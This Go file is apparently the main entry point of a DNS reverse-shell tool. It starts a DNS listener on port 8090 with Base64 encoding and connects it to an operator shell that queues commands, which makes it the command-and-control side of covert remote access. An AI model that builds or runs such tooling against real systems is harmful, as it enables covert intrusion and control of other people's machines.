package main

import (
	"dns-reverse-shell/main/encoder"
	"dns-reverse-shell/main/protocol"
	"dns-reverse-shell/main/shell"
)

func main() {
	callbackChan := make(chan bool)
	listener := protocol.NewDnsServer("8090", encoder.NewBase64Encoder(), callbackChan)
	s := shell.NewShell(listener.QueueCommand, callbackChan)
	go s.Start()
	listener.Serve()
}
